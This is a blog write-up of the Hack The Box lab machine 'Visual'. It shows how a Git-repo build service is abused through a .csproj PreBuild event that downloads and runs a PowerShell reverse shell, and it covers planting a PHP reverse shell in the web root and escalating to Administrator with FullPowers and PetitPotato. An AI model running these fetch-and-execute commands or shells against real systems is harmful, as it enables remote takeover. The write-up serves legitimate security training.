<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Visual</title>
<meta name=description content="Platform: Hack The Box Link: Visual Level: Medium OS: Windows Target IP address is 10.10.11.234
Scanning sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 I run my …"><meta name=keywords content><meta property="og:url" content="https://scorpiosec.com/posts/htb-visual/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Visual"><meta property="og:description" content="Platform: Hack The Box Link: Visual Level: Medium OS: Windows Target IP address is 10.10.11.234
Scanning sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 I run my …"><meta property="og:image" content="https://scorpiosec.com/redscorpio.jpg"><meta property="og:image:secure_url" content="https://scorpiosec.com/redscorpio.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Visual"><meta name=twitter:description content="Platform: Hack The Box Link: Visual Level: Medium OS: Windows Target IP address is 10.10.11.234
Scanning sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 I run my …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-visual/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-visual/"><meta name=twitter:image content="https://scorpiosec.com/redscorpio.jpg"><link rel=canonical href=https://scorpiosec.com/posts/htb-visual/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-visual/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Visual</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>February 24, 2024</span>
| Updated March 19, 2025</p><ul class=post-tags></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Visual>Visual</a></li><li>Level: Medium</li><li>OS: Windows</li></ul><hr><p>Target IP address is <code>10.10.11.234</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
</code></pre><p>I run my usual scan and I get some information:</p><ul><li>Apache web server is running on the target</li><li>It is a Windows machine (Though you can see that on the machine page)</li><li>A PHP application is hosted on the machine running on port 80</li></ul><pre tabindex=0><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
Nmap scan report for 10.10.11.234
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
</code></pre><h2 id=enumeration>Enumeration</h2><p>We get to the web application by visiting <code>http://10.10.11.234</code>. The application appears to be a service allowing users to submit a Git repo URL, it will then compile the .NET project from for the user.</p><p><img src=/images/HTB-Visual/Visual-webapp.png alt="Visual Webapp"></p><p>I test the functionality by sending a custom URL, using the Python3.</p><pre tabindex=0><code>python3 -m http.server
</code></pre><p>I then submit my link <code>http://10.10.14.222:8000</code> (Replace <code>10.10.14.222</code> by your IP address)</p><p><img src=/images/HTB-Visual/link-submit-Visual-1.png alt=Link-submit1></p><p>It redirects me to this page, where the application tries to compiles my project.
<img src=/images/HTB-Visual/Visual-build-attempt.png alt="Build attempt"></p><p>Because there is no project at this URL the operation fails but I get some information. This application looks for a <code>.sln</code> file.</p><blockquote><p>A .sln file is a solution file used by Microsoft Visual Studio. The file serves as a container for one or more projects. It helps organize and manage related projects within a single workspace. The <code>.sln</code> file stores information about the projects contained within it, including their dependencies, build configurations, and references to external libraries or resources.</p></blockquote><p><img src=/images/HTB-Visual/Visual-build-failure.png alt="Build failure"></p><p>I can see what I received from the application back on my server.</p><p><img src=/images/HTB-Visual/python3server-GET-method-1.png alt="Get method server"></p><p>I see a code 404, because no file was found at my URL and <code>GET /info/refs?service=git-upload-pack HTTP/1.1" 404</code>. It seems that the application is using the <code>git-upload-pack</code> service which is a part of the Git protocol used for operations like cloning or fetching changes from a remote repository. Read more about it <a href=https://git-scm.com/docs/git-upload-pack>here</a>.</p><p>From the application page we gather that our link must lead to a .NET 6.0 project with a <code>.sln</code> file.</p><p><img src=/images/HTB-Visual/Visual-dotnet-support.png alt="Visual support"></p><h2 id=initial-foothold>Initial Foothold</h2><p>I never used .NET so I asked ChatGPT to show me how to create projects for it.</p><pre tabindex=0><code>dotnet new sln -n visual
</code></pre><p>When you run the command <code>dotnet new sln -n visual</code>, it creates a new solution file named <code>visual.sln</code>.
<img src=/images/HTB-Visual/dotnet-new-sln.png alt="Dotnet new sln"></p><pre tabindex=0><code>dotnet new console -n visual
</code></pre><p>This command creates a new console application project named <code>visual</code>. This project will contain the necessary files and configurations for a basic console application written in C#.</p><p><img src=/images/HTB-Visual/dotnet-new-console.png alt="Dotnet new console"></p><p>We add the <code>visual.csproj</code> project file located in the <code>visual</code> directory to the solution file (<code>visual.sln</code>).</p><pre tabindex=0><code>dotnet sln add visual/visual.csproj
</code></pre><p><img src=/images/HTB-Visual/dotnet-sln-add.png alt="Dotnet sln add"></p><blockquote><p>In .NET projects, a <code>.csproj</code> file is a project file that is used to define and configure the project. It is an XML-based file that contains metadata and settings about the project, such as its dependencies, build settings, target framework, and more.</p></blockquote><p><code>git init</code> is used to initialize a new Git repository.</p><pre tabindex=0><code>git init
</code></pre><p><img src=/images/HTB-Visual/visual-git-init.png alt="Visual git init"></p><p>We need to find a way to serve our Git repo to the application I found a great blog post about it here, <a href=https://theartofmachinery.com/2016/07/02/git_over_http.html>A Quick and Hacky Way to Serve a Git Repo over HTTP</a>.</p><p>We now run these commands</p><pre tabindex=0><code>git add .
git commit -m &#34;Test&#34;
cd .git
git --bare update-server-info
cd ..
</code></pre><blockquote><p>We will have to run them every time we make any changes to our files.
When you run <code>git --bare update-server-info</code>, Git updates the auxiliary files necessary for serving the repository over the network.</p></blockquote><p>Run your python server again with <code>python3 -m http.server</code> and submit your URL now that we have the right files.</p><pre tabindex=0><code>http://10.10.14.222:8000/.git
</code></pre><p><img src=/images/HTB-Visual/url-submission-visual1.png alt="Visual link submit2"></p><p>The building process is successful this time.</p><p><img src=/images/HTB-Visual/visual-building-successful.png alt="Visual successful build"></p><p>Back on our server we get some successful GET requests.</p><p><img src=/images/HTB-Visual/server-good-requests.png alt="Server good requests"></p><p>I can see that the application is compiling the files in the git repo. We need to find a way to exploit this process. After some googling, I found this <a href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022">Microsoft page</a> explaining that a &ldquo;pre-build event&rdquo; refers to a script or command that is executed before the build process for the project begins.</p><p>We can use a <code>PreBuild</code> event in the <code>.csproj</code> file to execute some commands. So let&rsquo;s try to add a reverse shell.</p><ul><li>Below is my modified <code>.csproj</code> file</li></ul><pre tabindex=0><code>&lt;Project Sdk=&#34;Microsoft.NET.Sdk&#34;&gt;

  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;/PropertyGroup&gt;

&lt;Target Name=&#34;PreBuild&#34; BeforeTargets=&#34;PreBuildEvent&#34;&gt;
    &lt;Exec Command=&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.222:8000/revshell.ps1&#39;)&#34; /&gt;
  &lt;/Target&gt;

&lt;/Project&gt;
</code></pre><ul><li>Let&rsquo;s create a <code>revshell.ps1</code> PowerShell script to get a remote shell. I used this <a href=https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1>nishang shell</a> for the reverse shell. I took this <a href=https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>shell</a>, changed the function name and added the reverse switch at the end.</li></ul><p>I setup a netcat listener with</p><pre tabindex=0><code>nc -nvlp 9001
</code></pre><p>We use the git commands again</p><pre tabindex=0><code>git add .
git commit -m &#34;Add as a test&#34;
cd .git
git --bare update-server-info
cd ..
</code></pre><p>If you stopped your Python server start it again (and leave it running) and submit your link.</p><p>The listener should catch a shell after the compilation is done, we are in!</p><p><img src=/images/HTB-Visual/nc-listener-shell.png alt="nc listener, reverse shell"></p><p>Running <code>whoami</code> I see that I&rsquo;m currently connected as the user <code>enox</code>.</p><p><img src=/images/HTB-Visual/target-whoami.png alt="whoami command on target"></p><p>We can check our privileges with <code>whoami /priv</code>.
<img src=/images/HTB-Visual/target-priv.png alt="privilege on target machine"></p><p>I go to the user main directory with <code>cd \Users\enox</code> and I use <code>ls</code> to see the different subdirectories.</p><p><img src=/images/HTB-Visual/target-directories.png alt="directories listing on target"></p><p>I check the content of the <code>Desktop</code> directory with <code>dir Desktop</code> and I can see the <code>user.txt</code> flag. Use <code>cat user.txt</code> to check its content.</p><p><img src=/images/HTB-Visual/Visual-user-flag.png alt="User flag"></p><h3 id=lateral-movement>Lateral Movement</h3><p>To find privilege escalation paths let&rsquo;s use <a href=https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023>winPEAS</a> . Get <code>WinPEASany.exe</code> and store it in the repository that you are using for your python server.</p><p><img src=/images/HTB-Visual/winPEAS-location.png alt="winPEAS location"></p><p>Get it to the target with <code>wget</code>.</p><pre tabindex=0><code>wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
</code></pre><blockquote><p>Use your IP address and replace the port by the one you are using for your server</p></blockquote><p>Verify that the file is on the target.</p><p><img src=/images/HTB-Visual/winPEAS-on-target.png alt="winPEAS location on target"></p><p>You can check the options of winPEAS with <code>./wpany.exe -h</code>.</p><p><img src=/images/HTB-Visual/winpeas-options.png alt="winPEAS options"></p><p>Run it with the options you want, Because I want a somewhat thorough enumeration I am using this command</p><pre tabindex=0><code>./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
</code></pre><p>It seems that we have permissions to the directory containing the Apache HTTP Server service.</p><p><img src=/images/HTB-Visual/ApacheServerHTTP.png alt="Apache Server HTTP"></p><p>Going through the output you can notice that you have full access to the <code>xampp</code> directory (remember this is a PHP application), the same folder storing Apache.</p><p><img src=/images/HTB-Visual/xampp-permissions.png alt="xampp directory"></p><p>We can attempt to learn more about <code>ApacheHTTPServer</code> with</p><pre tabindex=0><code>Get-CIMInstance -Class Win32_Service -Filter &#34;Name=&#39;ApacheHTTPServer&#39;&#34; | Select-Object *
</code></pre><p>This is the output we get, it seems like it runs under <code>NT AUTHORITY\Local Service</code>.</p><p><img src=/images/HTB-Visual/AppacheHTTPServer-info-1.png alt="Apache HTTP Server service info"></p><blockquote><p>&ldquo;On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user <code>NT AUTHORITY\LOCAL SERVICE</code>&mldr;&rdquo;. Basically we can achieve privilege escalation via this account. Read more about it <a href=https://itm4n.github.io/localservice-privileges/>here</a>.</p></blockquote><p>The service runs under <code>NT AUTHORITY\Local Service</code> so we need to escalate to that account. Since we have access to the <code>xampp</code> directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.</p><blockquote><p>In PHP applications, the XAMPP folder serves as the root directory for hosting web files (such as HTML, PHP, CSS, JavaScript, images, etc.) and managing server configuration settings.</p></blockquote><pre tabindex=0><code>cd C:\Xampp\
ls
</code></pre><p><img src=/images/HTB-Visual/xampp-content-1.png alt="xampp directory content"></p><p>Notice the <code>htdocs</code> folder.</p><blockquote><p>In XAMPP, the <code>htdocs</code> directory serves as the default web server document root. This means that any files placed within the <code>htdocs</code> directory will be accessible through a web browser when the XAMPP server is running.</p></blockquote><p>The application files are here as you can see. We can put a PHP reverse shell in the <code>htdocs</code> directory.</p><p><img src=/images/HTB-Visual/xampp-htdocs.png alt="xampp htdocs directory"></p><p>This is the <a href=https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php>PHP reverse shell</a> I used.</p><p>I then run <code>wget http://10.10.14.222:8000/revshell.php -o rev.php</code> to get it to the target.</p><p><img src=/images/HTB-Visual/php-reverse-shell-1.png alt="PHP reverse shell on the target"></p><p>Let&rsquo;s setup a netcat listener with</p><pre tabindex=0><code>nc -nvlp 8010
</code></pre><blockquote><p>Use the port number that you specified in the PHP reverse shell.</p></blockquote><p>Go back to the browser and go to <code>http://&lt;target IP address>/rev.php</code>, come back to your listener and you should have a shell with the user <code>nt authority\local service</code>.</p><p><img src=/images/HTB-Visual/nt-authority-local-service.png alt="nt authority user shell on the target"></p><p>Check your privileges and you notice that you lack the <code>ImpersonatePrivilege</code> needed to get administrative privileges.</p><p>Let&rsquo;s run <code>whoami /priv</code>.</p><p><img src=/images/HTB-Visual/nt-authority-priv.png alt="nt authority user privileges"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>This <a href=https://itm4n.github.io/localservice-privileges/>blog</a> post gives you the link to a tool used to obtain more privileges. The tool is called <a href=https://github.com/itm4n/FullPowers>FullPowers</a>. Get it on the target machine (Make sure to use the reverse shell with <code>nt authority\local service</code>).</p><blockquote><p>We do not want the executable to be accessible through the browser so we <code>cd ..</code> back to the <code>xampp</code> directory before downloading our file.</p></blockquote><pre tabindex=0><code>wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
</code></pre><p>I get an error because we currently have a cmd shell and not a PowerShell one.</p><p><img src=/images/HTB-Visual/shell-error-1.png alt="nt authority user shell error"></p><p>Just run <code>powershell</code> and rerun the <code>wget</code> command.</p><p><img src=/images/HTB-Visual/powershell-fullpowers-dl.png alt="nt authority FullPowers dlownload"></p><p>Now we execute <code>fp.exe</code> and we get new privileges! Notice that it downgraded us again to a cmd shell and it also forced us out of the <code>xampp</code> folder, so we need to run <code>powershell</code> and <code>cd C:\xampp</code>.</p><p><img src=/images/HTB-Visual/nt-authority-new-priv.png alt="nt authority user new privileges"></p><p>Now we can use <a href=https://github.com/wh0amitz/PetitPotato>PetitPotato</a> to achieve privilege escalation by abusing impersonate privileges.</p><p>We get it to the target by running</p><pre tabindex=0><code>wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
</code></pre><p>However we get an error</p><pre tabindex=0><code>wget : Win32 internal error &#34;Access is denied&#34; 0x5 occurred while reading the console output buffer. Contact Microsoft 
</code></pre><p>It seems that this error is caused by the progress bar displayed on the terminal. It can be solved by running <code>$ProgressPreference = "SilentlyContinue"</code> before the <code>wget</code> command.</p><p>We can now use our file by running</p><pre tabindex=0><code>./pp.exe 3 cmd
</code></pre><p><img src=/images/HTB-Visual/PetitPotato-exploit.png alt="PetitPotato exploit"></p><p>We now have admin privileges, let&rsquo;s check.</p><pre tabindex=0><code>cd C:\Users\Administrator\Desktop
</code></pre><p>Then let&rsquo;s list the content of the directory, we got downgraded to a cmd shell again so we have to use <code>dir</code>.</p><p><img src=/images/HTB-Visual/root-flag.png alt="root flag"></p><p>We find the <code>root.txt</code>! Use <code>type root.txt</code> to see it.</p><p>That&rsquo;s it for my first Hack The Box writeup! I hope it was helpful. If you have any questions leave a comment or reach me on X <a href=https://twitter.com/_KScorpio>@_KScorpio</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-ohsint/>&#8592;
Previous:
THM: OhSINT</a></p><p class=prev-post-date>February 13, 2024</p></div><div class=next-post><p><a href=/posts/htb-cozyhosting/>Next:
HTB: CozyHosting
&#8594;</a></p><p class=next-post-date>March 2, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#lateral-movement>Lateral Movement</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024-2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>